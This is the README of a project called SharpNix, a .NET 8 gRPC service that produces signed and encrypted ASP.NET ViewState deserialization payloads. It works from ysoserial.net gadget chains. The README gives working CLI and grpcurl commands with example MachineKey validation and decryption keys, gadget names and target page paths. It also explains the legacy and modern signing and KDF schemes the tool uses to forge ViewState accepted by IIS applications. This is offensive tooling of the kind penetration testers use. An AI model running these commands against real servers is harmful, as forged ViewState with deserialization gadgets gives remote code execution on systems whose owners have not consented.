# SharpNix

A .NET 8 gRPC service running on Linux/WSL that generates signed and encrypted ASP.NET ViewState payloads. Built as a cross-platform alternative to running the full ysoserial.net toolchain on Windows.

The project splits ysoserial.net's ViewState plugin into two stages:
1. **Payload generation** (one-time, Windows) -- serialize gadget chains via ysoserial.exe into a SQLite database
2. **Signing/encryption** (on-demand, Linux/WSL) -- sign and encrypt payloads with target-specific MachineKey parameters via gRPC

## Project Structure

```
sharpnix/
├── EchoGrpc.sln                 # Solution file
├── Protos/
│   └── echo.proto               # gRPC service definitions (Echo + ViewState)
├── EchoServer/                  # ASP.NET Core gRPC server
│   ├── Services/
│   │   ├── EchoService.cs       # Simple echo RPC
│   │   └── ViewStateService.cs  # ViewState signing/encryption RPC
│   └── Helpers/
│       ├── ViewStateGenerator.cs # Ported crypto logic from ysoserial.net
│       └── PayloadStore.cs      # SQLite payload lookup
├── EchoClient/                  # Console gRPC client
│   └── Program.cs               # CLI with --viewstate, --list-gadgets, echo modes
├── PayloadGenerator/            # One-time tool to populate SQLite via ysoserial.exe
│   └── Program.cs               # Calls ysoserial.exe for each LosFormatter gadget
├── Procfile                     # Hivemind process definitions
├── create-dev-env.sh            # Dev environment setup script
├── run-dev.sh                   # Start server via hivemind
├── payloads.db                  # Generated SQLite database (gitignored)
└── .vscode/
    ├── launch.json              # Debug config for EchoClient
    └── tasks.json               # Build task for debugging
```

## Prerequisites

- .NET 8 SDK
- Linux/WSL
- ysoserial.exe (Windows, for payload generation only)

Run the setup script to install dependencies:

```bash
./create-dev-env.sh
```

This installs .NET SDK, hivemind, and grpcurl if not already present, then restores and builds the solution.

## Quick Start

### 1. Generate payload database (one-time, requires ysoserial.exe on Windows)

```bash
dotnet run --project PayloadGenerator -- \
  "D:\projects\ysoserial.net\ysoserial\bin\Debug\ysoserial.exe"
```

This calls ysoserial.exe via WSL interop for each of the 17 LosFormatter-compatible gadgets and stores the unsigned base64 payloads in `payloads.db`.

You can also specify a custom database path:

```bash
dotnet run --project PayloadGenerator -- \
  "D:\projects\ysoserial.net\ysoserial\bin\Debug\ysoserial.exe" \
  /path/to/payloads.db
```

### 2. Start the server

```bash
./run-dev.sh
```

Or without hivemind:

```bash
dotnet run --project EchoServer
```

The server listens on `http://localhost:5000` using insecure HTTP/2.

### 3. Use the client

**List available gadgets:**

```bash
dotnet run --project EchoClient -- --list-gadgets
```

**Generate a signed ViewState using a gadget from the database:**

```bash
dotnet run --project EchoClient -- --viewstate \
  --gadget TextFormattingRunProperties \
  --validation-key "70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" \
  --validation-alg SHA1 \
  --target-path "/app/page.aspx" \
  --app-path "/app/" \
  --legacy
```

**Generate using a raw unsigned payload (no database needed):**

```bash
dotnet run --project EchoClient -- --viewstate \
  --unsigned-payload "/wEPDwUKMDAwMDAwMDAwMGRk" \
  --validation-key "70DBAD..." \
  --validation-alg SHA1 \
  --legacy
```

**Modern mode (.NET >= 4.5) with encryption:**

```bash
dotnet run --project EchoClient -- --viewstate \
  --gadget TextFormattingRunProperties \
  --validation-key "70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" \
  --validation-alg HMACSHA256 \
  --decryption-key "34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" \
  --decryption-alg AES \
  --target-path "/app/page.aspx" \
  --app-path "/app/"
```

**Echo (basic gRPC test):**

```bash
dotnet run --project EchoClient -- "Hello, gRPC!"
```

### 4. Test with grpcurl

```bash
grpcurl -plaintext localhost:5000 list
grpcurl -plaintext localhost:5000 echo.ViewState/ListGadgets
grpcurl -plaintext -d '{"gadget":"TextFormattingRunProperties","validation_key":"70DBAD...","validation_alg":"SHA1","is_legacy":true}' \
  localhost:5000 echo.ViewState/Generate
```

## ViewState Client Options

| Option | Description |
|---|---|
| `--gadget <name>` | Gadget name from database (use `--list-gadgets` to see available) |
| `--unsigned-payload <base64>` | Raw LosFormatter payload (alternative to `--gadget`) |
| `--validation-key <hex>` | MachineKey validationKey (required) |
| `--validation-alg <alg>` | SHA1, HMACSHA256 (default), HMACSHA384, HMACSHA512 |
| `--decryption-key <hex>` | MachineKey decryptionKey (required for modern mode) |
| `--decryption-alg <alg>` | AES (default), 3DES, DES |
| `--target-path <path>` | Target ASPX page path, e.g. `/app/page.aspx` |
| `--app-path <path>` | IIS application path, e.g. `/app/` |
| `--viewstate-user-key <key>` | Anti-CSRF ViewStateUserKey value |
| `--legacy` | Use .NET <= 4.0 legacy algorithm |
| `--encrypted` | Encrypt payload (legacy mode only) |
| `--generator <hex>` | `__VIEWSTATEGENERATOR` value (implies `--legacy`) |

## Debugging

Open the project in VS Code with the C# Dev Kit extension installed. Set breakpoints in `EchoClient/Program.cs`, start the server in a terminal, then press F5 to debug the client.

## How It Works

The ViewState signing logic is ported from ysoserial.net's `ViewStatePlugin.cs` and `MachineKeyHelper.cs` to run natively on .NET 8 / Linux. The crypto operations (HMAC, AES, SP800-108 KDF) all use `System.Security.Cryptography`, which is fully cross-platform.

**Legacy mode (.NET <= 4.0):** Computes HMAC over `payload || pageHash || viewStateUserKey` using the validation key directly.

**Modern mode (.NET >= 4.5):** Derives encryption and validation subkeys via NIST SP800-108 counter-mode KDF (HMAC-SHA512), encrypts with AES-CBC, then signs `IV || ciphertext` with the derived validation key.

Gadget chain generation (BinaryFormatter/LosFormatter serialization) is **not** ported -- it requires .NET Framework APIs unavailable in .NET 8. Instead, payloads are pre-generated via ysoserial.exe on Windows and stored in SQLite for reuse.
